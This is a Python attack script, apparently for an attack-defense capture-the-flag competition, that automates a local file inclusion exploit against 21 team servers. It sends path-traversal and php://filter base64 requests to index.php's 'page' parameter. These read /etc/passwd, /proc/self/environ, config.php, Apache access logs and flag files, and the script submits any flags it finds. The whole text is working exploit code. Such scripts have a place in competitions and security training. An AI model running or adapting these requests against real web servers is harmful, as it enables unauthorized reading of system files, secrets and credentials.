import requests, time
from flag_sender import extract_flag, send_flag

N_EQUIPOS = 21
targets = [f'10.66.{i}.4' for i in range(1, N_EQUIPOS + 1)]
port = 8080
DEPTH = 10

COMMON_PATHS = [
    "/var/flags/flag.txt",
    "/var/www/html/index.php",
    "/var/www/html/config.php",
    "/etc/passwd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "/flag.txt"
]

def try_read(ip, path):
    url = f"http://{ip}:{port}/index.php?page=" + ("../" * DEPTH) + path.lstrip("/")
    r = requests.get(url, timeout=5)
    return r.text

def php_filter_read(ip, path):
    url = f"http://{ip}:{port}/index.php?page=php://filter/convert.base64-encode/resource=" + path.lstrip("/")
    r = requests.get(url, timeout=5)
    return r.text

def main():
    for ip in targets:
        print(f"[+] Probando {ip}:{port}")
        for p in COMMON_PATHS:
            try:
                text = try_read(ip, p)
                if not text and p.endswith(".php"):
                    text = php_filter_read(ip, p)
                flag = extract_flag(text)
                if flag:
                    print(f"[+] Flag encontrada en {ip}: {flag}")
                    print(send_flag(flag))
                else:
                    print(f"[-] No se encontr√≥ flag en {ip} ({p})")
            except requests.RequestException as e:
                print(f"[!] Error en {ip} ({p}): {e}")
        time.sleep(1)

if __name__ == "__main__":
    main()